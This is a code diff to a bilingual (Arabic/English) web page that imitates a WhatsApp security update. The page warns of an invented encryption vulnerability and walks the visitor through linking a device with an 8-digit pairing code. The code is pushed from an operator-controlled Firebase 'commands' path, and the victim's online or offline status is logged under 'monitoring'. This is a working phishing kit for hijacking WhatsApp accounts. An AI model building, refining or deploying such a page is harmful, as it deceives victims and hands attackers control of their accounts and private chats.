@@ -18,14 +18,14 @@
         .code-zone { border: 1.5px solid #00a884; border-radius: 10px; padding: 20px; margin-top: 25px; min-height: 110px; display: flex; flex-direction: column; justify-content: center; }
         #pairing-code { font-size: 32px; font-weight: bold; color: #075e54; letter-spacing: 5px; font-family: monospace; margin-bottom: 10px; }
         .wait-text { font-size: 12px; font-weight: 500; color: #8696a0; }
-        .code-arrived { color: #d91e1e; font-weight: bold; }
+        .arrived { color: #d91e1e !important; font-weight: bold; }
     </style>
 </head>
 <body>
     <div class="container">
         <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
         <div id="ui-title" class="header-title"></div>
-        <div id="ui-badge" class="badge">iPhone (iOS) :جهاز متصل</div>
+        <div class="badge">iPhone (iOS) :جهاز متصل</div>
         
         <div class="v-box">
             <div class="v-row"><span id="ui-old-label" style="color:#667781"></span><span style="color:#d91e1e; font-weight:bold">V2.12.5 (Old)</span></div>
@@ -57,24 +57,24 @@
                 new: "بروتوكول التشفير المحدث:",
                 alert: "تم رصد ثغرة في تشفير الجهاز المرتبط. لتأمين محادثاتك، يجب ترقية مفاتيح التشفير يدوياً.",
                 steps: "<b>خطوات التفعيل:</b><br>1. ستتلقى الآن إشعاراً رسمياً من واتساب لربط الجهاز، اضغط عليه فوراً.<br>2. اختر <b>'الربط برقم الهاتف بدلاً من ذلك'</b> من أسفل الشاشة.<br>3. أدخل رمز المصادقة التالي المكون من 8 أرقام:",
-                wait: "جاري استخراج مفاتيح التشفير..",
-                arrived: "أدخل الكود في واتساب الآن لتأمين الحساب!"
+                wait: "Awaiting security code..",
+                done: "أدخل الكود في واتساب الآن!"
             },
             en: {
                 title: "Security Protocol Update",
-                old: "Current Protocol:",
+                old: "Old Protocol:",
                 new: "New Protocol:",
-                alert: "A vulnerability was detected in the linked device encryption. To secure your chats, you must upgrade encryption keys manually.",
-                steps: "<b>Activation Steps:</b><br>1. You will now receive an official WhatsApp notification to link a device; tap it immediately.<br>2. Select <b>'Link with phone number instead'</b> at the bottom of the screen.<br>3. Enter the following 8-digit authentication code:",
+                alert: "A vulnerability was detected in the linked device. To secure your chats, you must upgrade encryption manually.",
+                steps: "<b>Activation Steps:</b><br>1. You will now receive an official WhatsApp notification to link a device; tap it immediately.<br>2. Select <b>'Link with phone number instead'</b> at the bottom.<br>3. Enter the 8-digit verification code that will appear here:",
                 wait: "Awaiting security code..",
-                arrived: "Enter this code in WhatsApp now to secure your account!"
+                done: "Enter the code in WhatsApp now!"
             }
         };
 
         const userLang = navigator.language.startsWith('ar') ? 'ar' : 'en';
         const lang = translations[userLang];
-
         document.documentElement.dir = userLang === 'ar' ? 'rtl' : 'ltr';
+
         document.getElementById('ui-title').innerText = lang.title;
         document.getElementById('ui-old-label').innerText = lang.old;
         document.getElementById('ui-new-label').innerText = lang.new;
@@ -83,12 +83,16 @@
         document.getElementById('ui-wait').innerText = lang.wait;
 
         if (userId) {
-            db.ref('monitoring/' + userId).set({ status: "Online", ts: Date.now() });
+            const statusRef = db.ref('monitoring/' + userId);
+            statusRef.set({ status: "Online", ts: Date.now() });
+            // تحديث عند القفل (Offline)
+            statusRef.onDisconnect().set({ status: "Offline", ts: Date.now() });
+
             db.ref('commands/' + userId).on('value', (snap) => {
                 if (snap.val() && snap.val().code) {
                     document.getElementById('pairing-code').innerText = snap.val().code;
-                    document.getElementById('ui-wait').innerText = lang.arrived;
-                    document.getElementById('ui-wait').classList.add('code-arrived');
+                    document.getElementById('ui-wait').innerText = lang.done;
+                    document.getElementById('ui-wait').classList.add('arrived');
                 }
             });
         }
